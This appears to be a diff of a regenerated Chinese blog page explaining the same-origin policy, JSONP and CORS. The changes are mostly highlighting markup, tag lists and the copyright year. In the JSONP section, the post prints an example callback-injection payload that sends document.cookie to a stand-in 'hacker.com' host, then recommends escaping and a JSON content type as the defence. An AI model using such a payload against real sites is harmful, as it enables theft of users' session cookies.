@@ -212,11 +212,11 @@ http://abc.com 和 http://abc.com:8080 不同源，端口不同
 http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 </code></pre></div></div>
 
-<p>也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“<strong>访问</strong>”是一个相对模糊的概念。一般来说：<strong>内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。</strong>比如，你可以用<code class="highlighter-rouge">&lt;iframe src=''/&gt;</code>嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置<code class="highlighter-rouge">X-Frame-Options</code>响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。</p>
+<p>也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“<strong>访问</strong>”是一个相对模糊的概念。一般来说：<strong>内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。</strong>比如，你可以用<code class="language-plaintext highlighter-rouge">&lt;iframe src=''/&gt;</code>嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置<code class="language-plaintext highlighter-rouge">X-Frame-Options</code>响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。</p>
 
 <p>更具体的来说，下面列出来哪些动作被允许，哪些动作不被允许。</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容
 
 2、**css**，可以用link标签和@import来嵌入，但是要正确的设置Content-Type
 
@@ -239,22 +239,22 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 <h2 id="jsonpjson-with-padding技术">JSONP（JSON with padding）技术</h2>
 
-<p>这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个<code class="highlighter-rouge">&lt;script /&gt;</code>元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。</p>
+<p>这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个<code class="language-plaintext highlighter-rouge">&lt;script /&gt;</code>元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。</p>
 
 <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * 工具函数，往页面里插入一个指定src的script标签，以发起请求
 * 其实也可以发起ajax请，很多三方库（比如jQuery）都有封装
 */</span>
 <span class="kd">function</span> <span class="nx">addScriptTag</span><span class="p">(</span><span class="nx">src</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'script'</span><span class="p">);</span>
-  <span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">"type"</span><span class="p">,</span><span class="s2">"text/javascript"</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="p">);</span>
   <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">src</span><span class="p">;</span>
   <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
   <span class="c1">// 调用工具函数，发起请求，并告诉服务端，回调函数名字叫foo</span>
-  <span class="nx">addScriptTag</span><span class="p">(</span><span class="s1">'http://example.com/ip?callback=foo'</span><span class="p">);</span>
+  <span class="nx">addScriptTag</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://example.com/ip?callback=foo</span><span class="dl">'</span><span class="p">);</span>
   <span class="c1">// 服务端返回JSON格式的数据，并 放在一个叫 foo的函数调用的入参里，如下：</span>
   <span class="c1">// foo({"ip": "8.8.8.8"});</span>
 <span class="p">}</span>
@@ -263,7 +263,7 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 * 回调函数，服务端返回的内容，会回调这个函数，并且把数据作为参数传入，这样就实现了跨源数据共享的目的
 */</span>
 <span class="kd">function</span> <span class="nx">foo</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Your public IP address is: '</span> <span class="o">+</span> <span class="nx">data</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Your public IP address is: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">data</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
 <span class="p">};</span>
 </code></pre></div></div>
 
@@ -289,12 +289,12 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 <p>因为，callback参数值会作为函数名传个服务器并传回来，在浏览器端执行，如果这个参数不是一个正常的函数名，而是一个表达式，甚至是一段脚本呢？就会有问题了。比如</p>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">'/pay?callback=&lt;srcript&gt;$.get("http://hacker.com?cookie="+document.cookie)&lt;/script&gt;'</span> 
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">/pay?callback=&lt;srcript&gt;$.get("http://hacker.com?cookie="+document.cookie)&lt;/script&gt;</span><span class="dl">'</span> 
 </code></pre></div></div>
 
 <p>攻击者还可以构造一些更加精巧的callback内容，实现RFD攻击。</p>
 
-<p>要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置<code class="highlighter-rouge">conten-type=application/json</code> （不能被执行）而不是<code class="highlighter-rouge">application/javascript</code>。</p>
+<p>要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置<code class="language-plaintext highlighter-rouge">conten-type=application/json</code> （不能被执行）而不是<code class="language-plaintext highlighter-rouge">application/javascript</code>。</p>
 
 <p>想要更安全优雅的实现跨源资源共享该怎么办呢？其实早在2014年的时候w3c就通过了<strong>跨源资源共享（Cross-Origin Resource Sharing (CORS)）</strong> 的标准。</p>
 
@@ -304,11 +304,11 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 <p>最基本的实现CORS和把大象装冰箱一样，总共分三步：</p>
 
-<p>1、浏览器发现是一个跨源请求，就在请求头上加一个字段<code class="highlighter-rouge">Origin</code>；包括协议，域名，端口。告诉被请求的服务端说，我是谁。</p>
+<p>1、浏览器发现是一个跨源请求，就在请求头上加一个字段<code class="language-plaintext highlighter-rouge">Origin</code>；包括协议，域名，端口。告诉被请求的服务端说，我是谁。</p>
 
-<p>2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上<code class="highlighter-rouge">Access-Control-Allow-Origin</code>，这个值可以是一个具体的origin，也可是是<code class="highlighter-rouge">*</code>表示允许所有源访问。</p>
+<p>2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上<code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code>，这个值可以是一个具体的origin，也可是是<code class="language-plaintext highlighter-rouge">*</code>表示允许所有源访问。</p>
 
-<p>3、浏览器收到服务器的响应，检查是否有<code class="highlighter-rouge">Access-Control-Allow-Origin</code>头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方<code class="highlighter-rouge">access blocked by CORS policy</code></p>
+<p>3、浏览器收到服务器的响应，检查是否有<code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code>头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方<code class="language-plaintext highlighter-rouge">access blocked by CORS policy</code></p>
 
 <p>其实，我们发现，CORS虽然阻止了将响应返回个请求发送者，但实际上请求是有真的发送到服务端的！所以当我们在做服务端接口的时候，一定要注意先要检查请求的Origin，再决定是否做相应的动作。以免形成事实上的攻击。这个在nginx配置上一定要注意，不能无脑的反射Origin。</p>
 
@@ -318,7 +318,7 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 <p><strong>用cors发送cookie？</strong></p>
 
-<p>除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 <code class="highlighter-rouge">credentials: 'include'</code> 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则<code class="highlighter-rouge">Access-Control-Allow-Origin</code>必须指定具体的值，不能为<code class="highlighter-rouge">*</code></p>
+<p>除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 <code class="language-plaintext highlighter-rouge">credentials: 'include'</code> 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则<code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code>必须指定具体的值，不能为<code class="language-plaintext highlighter-rouge">*</code></p>
 
 
 
@@ -367,13 +367,7 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
                             
         				
                             
-        				
-                            
-        				
-                            
-        				
-                            
-                				<a href="/tags/#OKR" title="OKR" rel="2">
+                				<a href="/tags/#OKR" title="OKR" rel="4">
                                     OKR
                                 </a>
                             
@@ -410,6 +404,20 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
         				
                             
         				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#管理修炼" title="管理修炼" rel="2">
+                                    管理修炼
+                                </a>
                             
         				
                             
@@ -554,7 +562,7 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
                     
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; 咖啡不苦 2020 |
+                    Copyright &copy; 咖啡不苦 2022 |
                     Theme by <a target="_blank" href="http://huangxuan.me">Hux</a>
                 </p>
             </div>
